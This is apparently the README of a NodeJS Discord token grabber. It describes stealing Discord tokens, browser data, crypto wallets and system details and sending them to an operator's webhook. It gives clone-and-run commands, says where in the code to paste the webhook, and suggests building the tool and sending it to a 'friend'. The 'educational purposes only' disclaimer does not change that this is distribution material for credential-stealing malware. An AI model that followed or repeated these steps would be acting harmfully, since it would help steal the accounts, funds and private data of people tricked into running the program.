<p align="center">Discord Token Grabber written in NodeJS, which extracts all Discord Access Tokens, browsers, crypto wallets and PC information, from each user to each drive. (PoC. For educational purposes only)</p>

---

## Description

Token Grabber created in NodeJS with features of a very powerful thief, this Token Grabber works by simply adding a discord webhook with which it will already send all the discord tokens and other data like local IP, username , ram information, etc...

This README provides a brief overview of what a token grabber is, its potential uses, and some ethical and legal considerations.

## How Token Grabbers Work

Token grabbers work by intercepting and capturing tokens as they are transmitted between a client and a server. This interception can occur through various means, such as exploiting vulnerabilities, man-in-the-middle attacks, or through malicious software or scripts injected into a user's device.

## Installation
- Follow these steps so you can have it
```bash
git clone https://github.com/k4itrun/DiscordTokenGrabber.git
```
```bash
cd DiscordTokenGrabber
```

> [!IMPORTANT]
> Before running the `index.js` make sure you have to add your **webhook** at the top of the code in the `webhook` constant with that you will get the information sent to the webhook

```bash
node index.js
```

## Usage

- *As I mentioned before (you have to add the webhook for the logs), so once you do that just run it*
    - *In the `index.js` file on line (14) is the variable, paste your webhook inside, with that it will work, you can simply build the code and send it to your friend*
